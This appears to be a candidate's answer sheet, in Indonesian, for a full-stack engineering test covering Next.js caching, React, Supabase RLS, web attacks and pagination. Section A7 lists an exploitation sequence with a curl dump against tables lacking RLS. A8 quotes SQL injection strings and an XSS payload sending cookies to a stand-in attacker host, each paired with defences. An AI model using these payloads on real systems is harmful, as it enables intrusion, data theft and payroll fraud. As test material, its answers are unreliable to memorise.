# Bagian A — Konsep & Fundamental

Kandidat: **Ade Rusmana** · TEST-ENG-FS-001

> Catatan: pengalaman produksi saya di Vue 3 / Nuxt, bukan React. Pertanyaan A2–A6
> dan A11–A12 spesifik Next.js, dan saya jawab sesuai pertanyaannya. Di tempat
> yang saya tidak yakin persis pada versi 15, saya tulis apa yang saya yakini dan
> apa yang akan saya cek — bukan menebak dengan nada pasti.

---

## A1. `unknown` vs `any`, dan kenapa `as` pilihan terakhir  [2]

`any` **mematikan** pemeriksaan tipe: nilainya bisa dibaca propertinya, dipanggil,
dan di-assign ke tipe apa pun tanpa keluhan. Ia juga menular — sekali `any` masuk,
seluruh ekspresi turunannya ikut kehilangan pemeriksaan. `unknown` adalah
kebalikannya: ia menerima nilai apa pun, tapi **tidak bisa dipakai** sebelum
dipersempit lewat `typeof`, `instanceof`, type guard, atau validasi skema.
Keduanya sama-sama menampung "saya belum tahu ini apa"; bedanya `unknown`
memaksa Anda membuktikannya, `any` memaksa Anda menanggung risikonya.

```ts
function handle(payload: unknown) {
  // payload.id            // ❌ error — bagus, itulah gunanya
  if (typeof payload === 'object' && payload !== null && 'id' in payload) {
    payload.id // ✅ sudah dipersempit
  }
}
```

`as SomeType` sebaiknya terakhir karena ia **klaim, bukan pemeriksaan**. Tidak ada
kode yang berjalan saat runtime; Anda hanya memberi tahu compiler untuk diam. Kalau
klaimnya salah, program tetap meledak — hanya saja sekarang tanpa peringatan, dan
di tempat yang jauh dari sumber masalahnya. Ini paling berbahaya tepat di batas
sistem (`await res.json()`), yaitu satu-satunya tempat yang benar-benar tidak bisa
dipercaya.

Alternatifnya, berurutan dari yang paling saya sukai:

1. **Validasi runtime** — Zod, `safeParse`. Menghasilkan tipe DAN memeriksanya.
2. **Type guard / predikat** — `function isOrder(v: unknown): v is Order`.
3. **Discriminated union** + `switch`, supaya penyempitan datang dari struktur data.
4. **`satisfies`** — memeriksa objek terhadap tipe tanpa melebarkan tipenya.
5. **Generic** yang benar, sehingga tipenya mengalir alih-alih ditegaskan.

Yang tersisa untuk `as` tinggal kasus di mana saya betul-betul tahu lebih banyak
dari compiler dan tidak bisa membuktikannya — misalnya `as const`, atau menyempitkan
`HTMLElement` menjadi `HTMLInputElement` setelah `querySelector`. Itu pun saya beri
komentar alasannya.

---

## A2. Server Component vs Client Component  [3]

**Server Component** (default di App Router) dirender di server. Ia boleh `async`,
boleh menyentuh database dan secret, dan **tidak mengirim JavaScript-nya ke
browser** — yang dikirim hanya hasil rendernya. Ia tidak boleh memakai state,
efek, event handler, atau API browser.

**Client Component** ditandai `"use client"` di baris pertama file. Ia tetap
di-render lebih dulu di server (SSR) lalu dihidrasi di browser, jadi bundelnya ikut
terkirim. Di situlah interaktivitas hidup.

**Kalau library yang mengakses `window` di-import ke Server Component:** modulnya
dievaluasi di Node, di mana `window` tidak ada, jadi hasilnya `ReferenceError:
window is not defined`. Kapan tepatnya tergantung di mana aksesnya:

- akses di **level modul** (mis. `const w = window.innerWidth` saat import) → gagal
  seketika saat modul dimuat, sering muncul sebagai error build/prerender;
- akses **di dalam fungsi** yang tidak pernah dipanggil di server → import-nya lolos,
  tapi tetap salah tempat: kalau fungsi itu perlu dipanggil, komponennya memang harus
  jadi Client Component.

Perbaikannya: pindahkan ke Client Component, atau `dynamic(() => import(...), { ssr: false })`,
atau tunda aksesnya ke `useEffect` yang hanya jalan di browser.

**Tiga kondisi yang mewajibkan `"use client"`:**

1. **State atau lifecycle** — `useState`, `useReducer`, `useEffect`, `useRef` untuk DOM.
2. **Event handler / interaktivitas** — `onClick`, `onChange`, `onSubmit`. Fungsi tidak
   bisa diserialisasi dan dikirim ke browser dari Server Component.
3. **API khusus browser** — `window`, `document`, `localStorage`, `IntersectionObserver`,
   `navigator.geolocation`.

(Tambahan yang sering terlupa: Context Provider dan custom hook yang di dalamnya
memakai ketiga hal di atas juga harus client.)

**Padanan di Nuxt**, yang saya pakai di Bagian D: semua komponen dirender di server
secara default; yang butuh browser dibungkus `<ClientOnly>`, ditaruh di `onMounted`,
atau diberi akhiran `.client.vue`. Konsepnya sama — bedanya Nuxt tidak mengirimkan
dua jenis komponen yang berbeda, ia mengirim satu komponen yang tahu kapan ia
berada di browser.

---

## A3. Angka dashboard "nyangkut" sampai hard refresh  [3]

Di Next.js App Router ada empat lapis cache yang berbeda, dan gejala "baru berubah
setelah hard refresh" biasanya menunjuk ke dua yang terakhir:

| Lapis | Letak | Umur | Ciri khas |
| --- | --- | --- | --- |
| **Request Memoization** | server, satu render pass | satu request | `fetch` sama dipanggil di beberapa komponen hanya jalan sekali |
| **Data Cache** | server, persisten | sampai di-revalidate | bertahan antar request bahkan antar deploy |
| **Full Route Cache** | server | sampai di-revalidate | HTML/RSC rute statis, dibuat saat build |
| **Router Cache** | **browser** | per sesi navigasi | navigasi client memakai payload RSC lama |

Di Next.js 15 default-nya sudah lebih aman dari versi 14: `fetch` **tidak** di-cache
secara default, dan GET Route Handler juga tidak. Jadi kalau angkanya tetap
nyangkut, tersangkanya menyempit ke: rute yang ter-render statis, `revalidate` yang
diset eksplisit, Router Cache di browser, atau — yang paling sering dilupakan —
CDN/proxy di depan aplikasi.

**Cara saya mendiagnosis, berurutan dari yang paling murah:**

1. **Bedakan client-nav vs hard refresh.** Kalau hard refresh selalu benar dan
   navigasi lewat `<Link>` yang salah, itu Router Cache di browser — bukan server.
2. **Baca output `next build`.** Rute bertanda `○` (static) berarti di-render sekali
   saat build; `ƒ` berarti dinamis. Dashboard operasional harus `ƒ`.
3. **Cek header respons** `x-nextjs-cache` (HIT/MISS/STALE) dan `age`/`cache-control`
   dari CDN.
4. **Taruh `console.log(new Date())` di dalam fungsi pengambil data.** Kalau log-nya
   tidak muncul saat halaman dimuat ulang, datanya datang dari cache, bukan dari DB.
5. **Baru terakhir curigai database** — replica lag pada read replica menghasilkan
   gejala yang sangat mirip dan sering terlewat.

**Perbaikannya, dari yang paling tepat sasaran ke yang paling tumpul:**

- yang paling benar: **`revalidateTag()`** dipanggil dari server action ketika datanya
  memang berubah, dengan `fetch(..., { next: { tags: ['cabinets'] } })`;
- `revalidatePath()` kalau yang perlu disegarkan satu rute utuh;
- `export const dynamic = 'force-dynamic'` atau `export const revalidate = 0` untuk
  halaman yang memang tidak boleh statis;
- `connection()` / `noStore()` untuk menandai satu titik sebagai dinamis;
- `router.refresh()` setelah mutasi, untuk membuang Router Cache di browser;
- atur `staleTimes` kalau perilaku Router Cache-nya yang bermasalah.

Yang saya hindari: menempel `?t=${Date.now()}` pada URL. Itu menyembunyikan gejala,
membuat cache tidak pernah kena untuk siapa pun, dan menyulitkan orang berikutnya
menemukan penyebab aslinya.

**Di Bagian D** saya menyelesaikan ini di tingkat kebijakan, bukan tambal-sulam:
`routeRules` menetapkan `cache-control: no-store` untuk seluruh `/api/**`. Dashboard
operasional adalah pembacaan waktu-nyata; kesegaran adalah produknya.

---

## A4. Ketik cepat "JKT", yang tampil hasil "JK"  [3]

**Penyebabnya bukan debounce — ini race condition.** Efeknya memang jalan tiap kali
`query` berubah, jadi permintaan untuk "J", "JK", dan "JKT" semuanya terkirim. Yang
tidak dijamin adalah **urutan datangnya**. Kalau respons "JK" tiba setelah "JKT"
(kebetulan lebih lambat di jaringan, atau query-nya lebih berat di DB), maka
`setData` terakhir yang menang adalah milik "JK". Layar menampilkan hasil untuk kata
kunci yang sudah tidak ada lagi di kotak input.

Debounce mengurangi peluangnya, tapi **tidak menghilangkannya**: dua permintaan yang
lolos debounce tetap bisa saling mendahului. Jadi yang wajib diperbaiki adalah
pembatalannya; debounce adalah bonus efisiensi.

```tsx
useEffect(() => {
  // Kotak kosong: jangan panggil server sama sekali.
  if (!query) {
    setData([])
    return
  }

  const controller = new AbortController()

  // Debounce: berhenti mengirim permintaan untuk kata yang belum selesai diketik.
  const timer = setTimeout(() => {
    fetch(`/api/cabinets?q=${encodeURIComponent(query)}`, { signal: controller.signal })
      .then((r) => {
        if (!r.ok) throw new Error(`HTTP ${r.status}`)
        return r.json()
      })
      .then(setData)
      .catch((error) => {
        // Pembatalan bukan kegagalan — jangan tampilkan sebagai error ke pengguna.
        if (error.name !== 'AbortError') setError(error)
      })
  }, 300)

  // Cleanup jalan SEBELUM efek berikutnya. Inilah yang sesungguhnya memperbaiki bug:
  // permintaan "JK" dibatalkan begitu query berubah menjadi "JKT", jadi tidak ada
  // lagi respons basi yang bisa menang di akhir.
  return () => {
    clearTimeout(timer)
    controller.abort()
  }
}, [query])
```

Dua hal lain yang ikut diperbaiki di atas: `encodeURIComponent` (kata kunci berisi
`&` atau `#` akan merusak URL-nya), dan pemeriksaan `r.ok` (`fetch` **tidak** menolak
promise pada status 404 atau 500 — kesalahan yang sangat sering saya temui di review).

Untuk kode sungguhan saya lebih memilih tidak menulis ini sendiri: TanStack Query
(atau `useFetch` Nuxt, seperti di Bagian D) sudah menangani pembatalan, deduplikasi,
dan kunci cache dengan benar. Di Bagian D, pembatalan-per-kata-kunci ini ditangani
`useFetch` dengan `query` reaktif, dan debounce 350 ms hanya menghemat permintaan.

---

## A5. Kapan `useMemo` / `useCallback` berguna, kapan justru memperlambat  [2]

Keduanya tidak gratis: ada biaya memanggilnya, membandingkan array dependensi tiap
render, dan menahan nilai lama di memori. Keduanya baru menguntungkan kalau yang
dihemat lebih mahal dari ongkos itu.

**`useMemo` berguna** untuk komputasi yang benar-benar mahal atas data yang jarang
berubah — mengurutkan dan mengelompokkan 20.000 transaksi swap menjadi bucket per
jam, misalnya. Tanpa memo, itu dihitung ulang setiap kali komponen render, termasuk
saat yang berubah hanya posisi tooltip.

**`useMemo` merugikan** saat membungkus hal murah: `useMemo(() => a + b, [a, b])`
lebih lambat daripada `a + b`, dan lebih sulit dibaca. Juga merugikan kalau salah
satu dependensinya objek yang dibuat baru tiap render — memo-nya tidak pernah kena,
jadi Anda membayar ongkosnya dan tidak pernah menerima manfaatnya.

**`useCallback` berguna** ketika identitas fungsinya penting: fungsi yang diteruskan
ke anak yang dibungkus `React.memo`, atau yang masuk ke array dependensi `useEffect`.
Tanpa `useCallback`, fungsi baru tiap render membuat `React.memo` selalu meleset —
dan kalau fungsi itu ada di deps sebuah efek, efeknya jalan tanpa henti.

**`useCallback` merugikan** kalau anaknya tidak di-memo sama sekali. Identitas yang
stabil tidak menolong siapa pun; Anda hanya menambah kode. Ini pola yang paling
sering saya hapus saat review.

Catatan versi: dengan **React 19 dan React Compiler**, sebagian besar memoisasi
manual ini dikerjakan otomatis oleh compiler. Kalau proyeknya sudah memakai compiler,
menambahkan memo dengan tangan justru derau. Aturan saya tetap sama: ukur dulu
(React Profiler), baru memoisasi. Memoisasi yang dipasang "untuk berjaga-jaga"
adalah biaya yang pasti demi manfaat yang belum tentu ada.

---

## A6. Approve Klaim Garansi — optimistic vs pessimistic  [2]

**Pessimistic:** tombol ditekan → masuk keadaan pending (tombol nonaktif, spinner) →
tunggu server → baru UI berubah jadi "Disetujui". Pengguna menunggu 1,2 detik, tapi
yang terlihat di layar selalu sama dengan yang ada di database.

**Optimistic:** UI langsung menampilkan "Disetujui", permintaan dikirim di
belakang layar, dan kalau server menolak keadaannya dikembalikan. Terasa instan,
tapi ada jendela 1,2 detik di mana layar menampilkan sesuatu yang belum tentu benar.

**Saya pilih pessimistic untuk kasus ini.** Alasannya bukan preferensi teknis,
melainkan sifat aksinya: menyetujui klaim garansi adalah keputusan yang berkonsekuensi
uang, jarang dilakukan, dan tidak bisa dibatalkan sendiri oleh admin. Optimistic UI
membeli kecepatan yang terasa dengan menggadaikan kebenaran yang terlihat — pertukaran
yang bagus untuk tombol "like", buruk untuk persetujuan finansial. Admin yang melihat
"Disetujui" lalu berpindah halaman sebelum rollback sempat terjadi akan pergi dengan
keyakinan yang salah. Untuk aksi yang sering dan tidak berbahaya — menandai notifikasi
terbaca, mengubah urutan daftar — saya memilih optimistic tanpa ragu.

1,2 detik memang terasa lama, jadi saya bayar dengan cara lain: nonaktifkan tombol
seketika (sekaligus mencegah klik ganda), ganti labelnya menjadi "Memproses…", dan
kalau melewati ~2 detik tampilkan progres. Yang penting bukan menghilangkan waktu
tunggu, melainkan membuatnya terlihat sedang ditangani.

**Kalau server menolak:**

1. Kembalikan baris ke keadaan semula, tepat seperti sebelum klik — jangan tinggalkan
   layar setengah jadi.
2. Tampilkan **alasan dari server**, bukan "Terjadi kesalahan". "Klaim sudah disetujui
   pengguna lain" dan "Anda tidak punya wewenang untuk cabang ini" menuntut tindakan
   yang berbeda.
3. Pertahankan konteks kerjanya — jangan tutup modal, jangan hapus catatan yang sudah
   diketik.
4. Bedakan **kegagalan jaringan** (layak dicoba ulang, tawarkan tombol) dari
   **penolakan bisnis** (percuma diulang).
5. Kirim **idempotency key** pada requestnya. Tanpa itu, "coba lagi" setelah timeout
   berisiko menyetujui klaim yang sama dua kali — dan timeout adalah kegagalan yang
   paling ambigu, karena kita tidak pernah tahu apakah server sempat memprosesnya.

---

## A7. Row Level Security, dan apa yang terjadi tanpa RLS  [3]

**RLS** adalah otorisasi tingkat baris yang ditegakkan **oleh PostgreSQL sendiri**,
bukan oleh aplikasi. Setelah `ALTER TABLE attendance ENABLE ROW LEVEL SECURITY`,
tabel itu menolak semua akses kecuali ada POLICY yang mengizinkannya, dan policy itu
berupa ekspresi SQL yang dievaluasi per baris:

```sql
ALTER TABLE attendance ENABLE ROW LEVEL SECURITY;

CREATE POLICY attendance_self_read ON attendance
  FOR SELECT USING (user_id = auth.uid());

CREATE POLICY attendance_self_insert ON attendance
  FOR INSERT WITH CHECK (user_id = auth.uid());
```

Kekuatannya: aturan itu berlaku apa pun jalannya. Route handler baru, skrip admin,
atau orang yang memanggil PostgREST langsung — semuanya melewati policy yang sama.
Otorisasi di lapisan aplikasi hanya berlaku untuk jalur yang ingat memanggilnya.

**Anon key bukan rahasia.** Ia memang dirancang untuk ditaruh di browser; siapa pun
bisa membacanya dari bundel JavaScript. Satu-satunya yang menahan pemegang anon key
adalah RLS. Tanpa RLS, anon key setara dengan akses baca-tulis penuh ke tabel itu.

**Urutan eksploitasinya:**

1. Buka dashboard, buka DevTools → Sources, cari bundel. Ambil
   `NEXT_PUBLIC_SUPABASE_URL` dan `NEXT_PUBLIC_SUPABASE_ANON_KEY`. Ini butuh
   30 detik dan tidak menyentuh apa pun yang dilindungi.
2. Panggil REST API-nya langsung, di luar aplikasi:
   ```
   curl 'https://<proj>.supabase.co/rest/v1/attendance?select=*' \
        -H "apikey: <anon>" -H "Authorization: Bearer <anon>"
   ```
   Hasilnya **seluruh tabel absensi**: siapa bekerja di mana, koordinat GPS rumah dan
   kantornya, jam masuk-pulang, URL foto selfie. Ini pelacakan lokasi seluruh
   karyawan, dan sudah masuk kategori data pribadi menurut UU PDP.
3. `?select=*&limit=1000&offset=...` untuk mengunduh semuanya, dan
   `?user_id=eq.<id>` untuk membuntuti satu orang tertentu.
4. **Tulis**, bukan hanya baca: `POST /rest/v1/attendance` dengan `user_id` orang lain
   → absensi palsu. Ini penipuan penggajian, dan jejaknya menunjuk ke korban.
5. `PATCH ?id=eq.<n>` untuk mengubah jam, atau `DELETE` untuk menghapus bukti
   keterlambatan.
6. Ulangi untuk **setiap tabel lain** yang RLS-nya lupa dinyalakan. `select=*` pada
   endpoint root membocorkan skema, jadi menebak nama tabel pun tidak perlu.

**Pencegahan:** nyalakan RLS di **semua** tabel (baru dan lama — tabel baru tidak
otomatis aman), tulis policy per operasi, `REVOKE` privilege yang tidak perlu dari
role `anon`, simpan `service_role` key hanya di server dan tidak pernah dalam variabel
berawalan `NEXT_PUBLIC_`, pasang policy juga pada Storage bucket foto selfie
(URL foto yang bocor sama buruknya dengan barisnya), dan jadikan "RLS aktif" sebagai
tes yang gagal di CI, bukan item di checklist manual.

---

## A8. Tiga kelas serangan  [3]

Saya pilih **SQL injection, XSS, dan IDOR**, karena ketiganya benar-benar ada pada
kode di Bagian C — jadi jawaban ini bisa dibaca berdampingan dengan `C-code-review.md`.

### 1. SQL injection

**Cara kerja.** Input pengguna disambung ke teks SQL, sehingga data dibaca sebagai
perintah. Batas antara "apa yang saya cari" dan "apa yang harus dilakukan database"
hilang.

**Contoh di dashboard kita.** Persis kode C2:

```ts
`WHERE branch_id = '${branch}'`
```

Panggil `/api/orders?branch=' OR '1'='1` → kondisinya selalu benar → pesanan seluruh
cabang keluar, bukan hanya cabang yang boleh dilihat pengguna. Dengan sedikit lagi
usaha, `'; DROP TABLE orders; --` atau sub-select ke tabel `users` untuk memanen
hash password.

**Pencegahan.** Query berparameter, selalu — `db.query('... WHERE branch_id = $1', [branch])`.
Parameter dikirim terpisah dari teks query, jadi tidak pernah bisa diurai sebagai
perintah. Tambahkan validasi tipe di batas (Zod), dan hak akses database seminimal
mungkin. Yang **tidak** cukup: escaping manual dan blacklist kata kunci. Di Bagian D
tidak ada satu pun string pengguna yang masuk ke SQL; bahkan `ORDER BY` dibangun dari
peta tetap, bukan dari teks.

### 2. XSS (stored)

**Cara kerja.** Teks dari pengguna dirender sebagai HTML, sehingga `<script>` atau
handler `onerror` milik penyerang berjalan di dalam origin situs kita, dengan
seluruh hak pengguna yang sedang login.

**Contoh di dashboard kita.** Persis kode C1:

```tsx
<span dangerouslySetInnerHTML={{ __html: o.customerNote }} />
```

Pelanggan menulis catatan pesanan `<img src=x onerror="fetch('https://attacker/?c='+document.cookie)">`.
Yang tersimpan adalah data biasa. Yang meledak adalah **layar admin ops** saat ia
membuka daftar pesanan. Inilah yang membuat XSS tersimpan di alat internal begitu
berbahaya: korbannya justru pengguna dengan hak paling tinggi, dan penyerang tidak
perlu memancing siapa pun mengeklik apa pun.

**Pencegahan.** Render sebagai teks — `{o.customerNote}` di React, `{{ }}` di Vue —
keduanya meng-escape secara default. Kalau HTML kaya memang wajib, bersihkan dengan
DOMPurify **dan** batasi tag yang diizinkan. Tambahkan Content-Security-Policy
sebagai jaring pengaman, dan `HttpOnly` pada cookie sesi supaya pencurian cookie
lewat script tidak mungkin. Di Bagian D tidak ada satu pun `v-html`.

### 3. IDOR

**Cara kerja.** Endpoint menerima pengenal objek dari client dan mengambilkannya
tanpa memeriksa apakah pemanggilnya berhak atas objek itu. Otentikasi ada
("siapa kamu"), otorisasi tidak ("apakah ini milikmu").

**Contoh di dashboard kita.** `GET /api/orders?branch=B-07` — kode C2 mengambil
`branch` dari query string dan memakainya apa adanya. Supervisor cabang Kemayoran
cukup mengubah satu parameter di address bar untuk membaca pesanan, omzet, dan data
pelanggan seluruh cabang. Bentuk yang sama muncul pada `/api/claims/1042`: ganti
angkanya, baca klaim garansi orang lain.

**Pencegahan.** Jangan pernah percaya pengenal ruang lingkup yang datang dari client.
Ambil cabang yang berhak dari **sesi**, lalu jadikan itu bagian dari `WHERE`:

```ts
const session = await requireSession(req)
await db.query(
  `SELECT ... FROM orders WHERE branch_id = $1 AND branch_id = ANY($2)`,
  [branch, session.allowedBranchIds],
)
```

Kembalikan **404, bukan 403**, untuk objek di luar ruang lingkup — 403 memberi tahu
penyerang bahwa objeknya ada. Di database, RLS (A7) menegakkan aturan yang sama satu
lapis lebih dalam, sehingga endpoint yang lupa memeriksa pun tetap tidak bocor.

---

## A9. Offset vs cursor pagination pada 500.000 baris  [2]

**Saya pilih cursor (keyset) pagination** untuk daftar transaksi ini.

**Kenapa.** `LIMIT 20 OFFSET 48000` tidak melompat ke baris ke-48.001. PostgreSQL
tetap harus menghasilkan dan **membuang** 48.000 baris sebelumnya lebih dulu. Biayanya
tumbuh linear terhadap kedalaman halaman: halaman 1 instan, halaman 2.400 memindai
hampir separuh tabel, dan halaman terakhir adalah yang termahal. Pada 500.000 baris
yang terus bertambah, halaman-halaman akhir akan makin lambat setiap minggu, tanpa
ada satu pun deploy yang menyebabkannya. Keyset memakai baris terakhir yang sudah
dilihat sebagai titik mulai, sehingga index bisa langsung mencarinya — biayanya sama
untuk halaman 1 maupun halaman 25.000:

```sql
SELECT * FROM transactions
WHERE (created_at, id) < ($1, $2)   -- cursor dari baris terakhir halaman sebelumnya
ORDER BY created_at DESC, id DESC
LIMIT 20;
```

**Masalah offset saat data baru masuk di tengah pengguna membaca.** Offset menghitung
posisi, bukan menandai baris. Kalau daftarnya urut `created_at DESC` dan 5 transaksi
baru masuk setelah pengguna melihat halaman 1, seluruh isi daftar bergeser lima
posisi ke bawah. Halaman 2 kemudian dimulai lima baris lebih awal dari seharusnya:
**5 baris terakhir halaman 1 muncul lagi di halaman 2**. Kalau ada baris yang dihapus,
kebalikannya terjadi — beberapa baris **terlewat sama sekali** dan tidak pernah
terlihat. Untuk daftar transaksi keuangan, diam-diam melewatkan baris jauh lebih
buruk daripada lambat. Cursor kebal terhadap ini karena titik mulainya adalah
nilai baris, bukan hitungan posisi.

**Yang saya korbankan** dengan cursor: tidak bisa melompat ke "halaman 500", tidak
ada nomor halaman, butuh kunci sortir unik dan stabil (karena itu `(created_at, id)`,
bukan `created_at` saja — stempel waktu bisa kembar), dan mengganti kolom pengurutan
berarti mengganti bentuk cursor-nya.

**Kontras yang disengaja dengan Bagian D.** Di dashboard cabinet saya justru memilih
**offset**, dan itu bukan inkonsistensi. Daftar cabinet berjumlah puluhan hingga
ribuan (bukan ratusan ribu), diurutkan berdasarkan **agregat terhitung** yang tidak
tersimpan di kolom mana pun, dan UI-nya butuh "halaman 3 dari 12". OFFSET terburuk di
sana melewati beberapa ribu baris. Pilihan pagination adalah fungsi dari ukuran data,
kunci sortir, dan kebutuhan UI — bukan aturan universal. Alasan lengkapnya ada di
`README.md` §Asumsi 7.6, termasuk titik di mana saya akan pindah ke keyset.

---

## A10. Absensi selfie + GPS, end-to-end  [2]

**Alur yang saya bangun:**

1. **Browser** — minta izin kamera dan `navigator.geolocation`. Ambil foto, kompres
   di client (hemat kuota karyawan), baca `coords` beserta `accuracy`.
2. **Client memeriksa lebih dulu** — di dalam radius? akurasi masuk akal? Ini
   **semata-mata demi umpan balik cepat**, supaya karyawan tahu sebelum mengunggah.
   Nilainya nol sebagai kontrol keamanan.
3. **Minta izin unggah ke server** — client memanggil endpoint kita, server
   mengembalikan **signed upload URL** yang berumur pendek dengan path yang sudah
   ditentukan (`attendance/{userId}/{yyyy-mm-dd}/{uuid}.jpg`), batas ukuran, dan
   batas MIME. Client tidak pernah memilih sendiri path-nya, dan tidak pernah
   memegang kunci storage.
4. **Unggah langsung ke storage** dengan URL itu — jangan lewat aplikasi; foto
   berukuran megabyte tidak perlu membebani proses Node.
5. **Kirim check-in ke server** — `{ storagePath, lat, lng, accuracyM, capturedAt }`.
6. **Server memvalidasi ulang semuanya** — sesi valid; skema Zod; koordinat masuk
   akal; `evaluateCheckIn()` dijalankan **di sini**, terhadap daftar cabang yang
   diambil dari database dan bukan dari request; objek di storage benar-benar ada,
   benar-benar gambar, dan berada di path milik pengguna itu.
7. **Tulis satu baris** dengan koordinat, cabang hasil keputusan server, jarak,
   akurasi, path foto, dan `server_received_at` — **jam server, bukan jam device**.
   `UNIQUE (user_id, work_date, shift)` mencegah absensi ganda di tingkat database.

**Kenapa validasi di client tidak pernah cukup.** Semua yang berjalan di browser ada
di bawah kendali penyerang. DevTools bisa mengubah variabel, service worker bisa
memodifikasi respons, dan yang paling sederhana: `curl` bisa memanggil endpoint kita
tanpa membuka browser sama sekali. Validasi client adalah **fitur UX** — ia mencegah
kesalahan jujur. Validasi server adalah **kontrol keamanan** — ia mencegah kecurangan.
Keduanya dibutuhkan, dan keduanya tidak saling menggantikan.

**Dua cara memalsukan absensi, dan penangkalnya:**

**(1) Memalsukan lokasi.** Aplikasi mock-location di Android, atau di browser cukup
DevTools → Sensors → Custom location. Karyawan absen dari rumah seolah di cabang.

Penangkal, berlapis karena tidak ada satu pun yang cukup sendirian: tolak akurasi di
luar akal (GPS palsu sering melaporkan akurasi sempurna 1 m atau justru 0 —
keduanya mencurigakan); di Android native, periksa `isMock` pada `Location`; bandingkan
dengan **geolokasi IP** — koordinat Kemayoran dari IP seluler di Bandung layak
ditandai; deteksi **perpindahan mustahil** antar check-in berurutan (dua cabang
berjarak 40 km terpaut 3 menit); catat sidik jari device dan tandai satu device
yang meng-absen banyak orang. Yang saya hindari: memblokir otomatis berdasarkan satu
sinyal. GPS di dalam gudang berdinding logam memang buruk; menuduh karyawan jujur
lebih mahal daripada menahan satu absensi untuk ditinjau manusia.

**(2) Memakai ulang foto lama, atau foto orang lain.** Unggah selfie yang disimpan
kemarin, atau foto rekan yang benar-benar hadir.

Penangkal: URL unggah bertanda tangan yang berumur pendek dan **terikat pada
check-in itu**, sehingga foto tidak bisa disiapkan dari jauh hari; simpan **hash
perceptual** tiap foto dan tolak yang mirip dengan kiriman sebelumnya (ini menangkap
pemakaian ulang langsung); **face matching** terhadap foto referensi karyawan;
**liveness check** sederhana (kedip, atau gerakan yang diminta acak) untuk melawan
foto-dari-layar. EXIF sengaja saya sebut sebagai sinyal lemah — ia sepele dipalsukan
dan sering dibuang saat kompresi, jadi tidak boleh jadi tumpuan.

**(3) Melewati UI sepenuhnya** — `curl` langsung ke endpoint check-in. Ini yang paling
mudah dan paling sering terlupa. Penangkalnya bukan hal eksotis: otentikasi wajib,
rate limit per pengguna, waktu dari server bukan dari payload, dan `UNIQUE` di
database sebagai kata terakhir.

---

## A11. Kapan memakai hook `useServerState()` di Next.js 15?

**Premis pertanyaannya keliru. Tidak ada hook bernama `useServerState()` di React
maupun di Next.js 15.**

Saya cukup yakin karena tidak ada di dokumentasi React 19 maupun Next.js 15, dan
namanya sendiri bertentangan dengan model App Router: hook hanya berjalan di Client
Component, sedangkan "server state" justru hal yang tidak dipegang client.

Yang mungkin dimaksud, tergantung tujuannya:

| Kalau maksudnya… | Yang benar-benar ada |
| --- | --- |
| state hasil server action setelah submit | **`useActionState`** (React 19; sebelumnya `useFormState`) |
| status pending saat form dikirim | **`useFormStatus`** |
| UI optimistic sambil menunggu server | **`useOptimistic`** |
| membaca data server tanpa state client | **Server Component `async`** — cukup `await`, tidak perlu hook |
| dedup fetch di satu render pass | **`cache()`** dari React |
| state server yang di-cache di client | pustaka pihak ketiga: **TanStack Query**, SWR |

Kebetulan **Nuxt memang punya `useState()`** — state bersama yang aman-SSR dan
ter-serialisasi dari server ke client. Nama itu paling dekat dengan "useServerState",
dan saya menduga dari situlah kebingungannya berasal. Di Bagian D saya memakainya
lewat `useCookie` untuk tema, supaya kelas `dark` sudah benar di byte pertama HTML
alih-alih berkedip saat hidrasi.

Kalau ternyata ini API baru yang muncul setelah pengetahuan saya, cara saya
memeriksanya: cari di `node_modules/next/types` dan changelog rilis Next, bukan
mengarang perilakunya.

---

## A12. Kenapa `revalidateCache()` lebih cepat dibanding `revalidateTag()`?

**Premis pertanyaannya keliru pada dua tingkat, dan ini pertanyaan jebakan yang
lebih baik dijawab dengan menolak premisnya.**

**Pertama, `revalidateCache()` tidak ada.** Fungsi invalidasi cache yang benar-benar
ada di App Router adalah:

- **`revalidateTag(tag)`** — invalidasi semua entri Data Cache yang ditandai tag itu;
- **`revalidatePath(path)`** — invalidasi cache untuk satu rute;
- `unstable_cache` / `'use cache'` + `cacheTag`/`cacheLife` pada jalur yang lebih baru.

**Kedua, meskipun ada, "lebih cepat" bukan sumbu yang tepat.** Fungsi-fungsi ini tidak
membangun ulang apa pun saat dipanggil; keduanya hanya **menandai entri sebagai
basi**, dan pekerjaan berat baru terjadi pada request berikutnya. Panggilannya sendiri
nyaris gratis. Yang membedakan bukan kecepatan, melainkan **cakupan**: `revalidateTag`
tepat sasaran (semua yang bertag `cabinets`, di rute mana pun), `revalidatePath`
tumpul (satu rute utuh, termasuk data yang sebenarnya belum berubah).

Jadi pertanyaan yang benar bukan "mana yang lebih cepat", melainkan **"mana yang
membatalkan tepat sebanyak yang berubah, tidak lebih"** — dan itu hampir selalu
`revalidateTag`.

Saya menuliskan ini dengan percaya diri karena dua-duanya bisa diperiksa dalam satu
menit di `next/cache`. Kalau saya salah dan `revalidateCache` memang ditambahkan di
rilis setelah pengetahuan saya, saya akan mengoreksi diri — tapi menebak alasan
mengapa sesuatu yang tidak saya temukan itu "lebih cepat" akan jadi jawaban yang
mengarang, dan itu lebih buruk daripada mengatakan premisnya salah.
